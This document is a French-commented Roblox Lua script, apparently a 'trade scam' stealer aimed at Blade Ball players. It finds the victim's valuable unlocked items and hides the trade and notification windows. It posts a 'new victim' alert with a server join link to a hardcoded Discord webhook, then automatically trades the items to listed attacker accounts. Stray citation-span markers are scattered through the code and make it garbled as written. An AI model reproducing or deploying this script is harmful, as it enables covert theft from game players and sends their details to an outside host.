-- // CONFIGURATION PERSONNELLE
_[span_4](start_span)G.Usernames = {"Eblackblk", "FadySNA", "Andrewdagoatya", "ThunderStealthZap16"} -- Tes pseudos autorisés[span_4](end_span)
_[span_5](start_span)G.min_rap = 50 -- Valeur minimale pour cibler un objet[span_5](end_span)
_[span_6](start_span)G.pingEveryone = "Yes" -- Notification Discord[span_6](end_span)
_[span_7](start_span)G.webhook = "https://discord.com/api/webhooks/1473240091035172919/3SYPN5dFkO6mmwHqyFQl1S0hUJK5BvQQx3__goPnHZLXrc7cCQgbBgKjaSrQVFWglyhN"[span_7](end_span)

-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
[span_8](start_span)if _G.scriptExecuted then return end[span_8](end_span)
_[span_9](start_span)G.scriptExecuted = true[span_9](end_span)

local itemsToSend = {}
[span_10](start_span)local categories = {"Sword", "Emote", "Explosion"}[span_10](end_span)
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
[span_11](start_span)local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")[span_11](end_span)
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
[span_12](start_span)local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()[span_12](end_span)
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- // LOGIQUE RAP (Source: source.lua)
[span_13](start_span)local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items[span_13](end_span)

local function getRAP(category, itemName)
    local categoryRapData = rapData[category]
    if categoryRapData then
        for serializedKey, rap in pairs(categoryRapData) do
            if serializedKey:find(itemName) then
                return rap
            end
        end
    end
    [span_14](start_span)return 0[span_14](end_span)
end

-- // SCAN ET FILTRAGE
for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = getRAP(category, itemInfo.Name)
                if rap >= _G.min_rap then
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
                end
            end
        end
    [span_15](start_span)end[span_15](end_span)
end

-- // MASQUAGE DISCRET
tradeGui.Black.Visible = false
PlayerGui.Notifications.Notifications.Visible = false
tradeGui.Main.Visible = false
[span_16](start_span)tradeGui.Main:GetPropertyChangedSignal("Visible"):Connect(function() tradeGui.Main.Visible = false end)[span_16](end_span)

-- // FONCTIONS RESEAU
local function sendTradeRequest(user)
    local args = {[1] = Players:WaitForChild(user)}
    repeat task.wait(0.2)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
    [span_17](start_span)until response == true[span_17](end_span)
end

local function addItemToTrade(itemType, ID)
    [span_18](start_span)netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)[span_18](end_span)
end

-- // EXECUTION
if #itemsToSend > 0 then
    -- Envoi Webhook
    local data = {
        ["content"] = (_G.pingEveryone == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🎯 Nouvelle Victime Blade Ball",
            ["fields"] = {
                {name = "Joueur", value = plr.Name, inline = true},
                {name = "Lien", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId}
            },
            ["color"] = 65280
        }}
    }
    [span_19](start_span)request({Url = _G.webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})[span_19](end_span)

    -- Attente du créateur pour le trade
    local function checkAndTrade(player)
        if table.find(_G.Usernames, player.Name) then
            sendTradeRequest(player.Name)
            repeat task.wait(0.5) until tradeGui.Enabled == true
            for _, item in ipairs(itemsToSend) do addItemToTrade(item.itemType, item.ItemID) end
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
        [span_20](start_span)end[span_20](end_span)
    end
    
    for _, p in ipairs(Players:GetPlayers()) do checkAndTrade(p) end
    Players.PlayerAdded:Connect(checkAndTrade)
end

